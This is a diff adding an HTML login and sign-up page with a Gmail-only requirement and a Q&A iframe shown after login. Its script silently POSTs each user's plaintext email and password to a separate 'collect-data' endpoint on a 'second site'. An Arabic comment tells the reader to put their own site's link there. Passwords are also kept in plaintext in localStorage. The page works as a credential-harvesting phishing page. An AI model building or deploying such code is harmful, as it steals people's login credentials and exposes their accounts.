@@ -1,0 +1,173 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login and Sign Up Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('https://i.pinimg.com/originals/1a/cf/f8/1acff8d8802fffc75fa26447be9756cd.gif') no-repeat center center fixed;
+            background-size: cover;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            text-align: center;
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="email"],
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        input[type="submit"] {
+            background-color: #4caf50;
+            color: white;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        .switch {
+            text-align: center;
+        }
+        #home-page {
+            display: none;
+            width: 100%;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="login-form">
+        <h2>Login</h2>
+        <form onsubmit="login(event)">
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <input type="submit" value="Login">
+        </form>
+        <div class="switch">
+            <p>Don't have an account? <a href="#" onclick="toggleForm()">Sign up</a></p>
+        </div>
+    </div>
+
+    <div class="container" style="display: none;" id="signup-form">
+        <h2>Sign Up</h2>
+        <form onsubmit="signup(event)">
+            <label for="new-email">Email:</label>
+            <input type="email" id="new-email" name="new-email" required>
+            <label for="new-password">Password:</label>
+            <input type="password" id="new-password" name="new-password" required>
+            <input type="submit" value="Sign Up">
+        </form>
+        <div class="switch">
+            <p>Already have an account? <a href="#" onclick="toggleForm()">Login</a></p>
+        </div>
+    </div>
+
+    <div id="home-page">
+        <iframe src="https://a7med19.github.io/q-a/" style="width:100%; height:100%; border:none;"></iframe>
+    </div>
+
+    <script>
+        const backendUrl = 'https://your-second-site-url.com/collect-data'; // استبدل هذا برابط موقعك الثاني
+
+        function toggleForm() {
+            var loginForm = document.getElementById('login-form');
+            var signupForm = document.getElementById('signup-form');
+
+            if (loginForm.style.display === 'none') {
+                loginForm.style.display = 'block';
+                signupForm.style.display = 'none';
+            } else {
+                loginForm.style.display = 'none';
+                signupForm.style.display = 'block';
+            }
+        }
+
+        function signup(event) {
+            event.preventDefault();
+            var email = document.getElementById('new-email').value;
+            var password = document.getElementById('new-password').value;
+
+            if (!email.endsWith('@gmail.com')) {
+                alert('Email must be a Gmail address.');
+                return;
+            }
+
+            if (localStorage.getItem(email)) {
+                alert('Email is already registered.');
+                return;
+            }
+
+            var user = {
+                email: email,
+                password: password
+            };
+
+            localStorage.setItem(email, JSON.stringify(user));
+            sendDataToBackend(user);
+            alert('Sign up successful. Redirecting to home page...');
+            showHomePage();
+        }
+
+        function login(event) {
+            event.preventDefault();
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            var storedUser = localStorage.getItem(email);
+            if (!storedUser) {
+                alert('User not found. Please sign up first.');
+                return;
+            }
+
+            var user = JSON.parse(storedUser);
+            if (user.password === password) {
+                sendDataToBackend(user);
+                alert('Login successful. Redirecting to home page...');
+                showHomePage();
+            } else {
+                alert('Incorrect password.');
+            }
+        }
+
+        function showHomePage() {
+            document.getElementById('login-form').style.display = 'none';
+            document.getElementById('signup-form').style.display = 'none';
+            document.getElementById('home-page').style.display = 'block';
+        }
+
+        function sendDataToBackend(user) {
+            fetch(backendUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(user)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
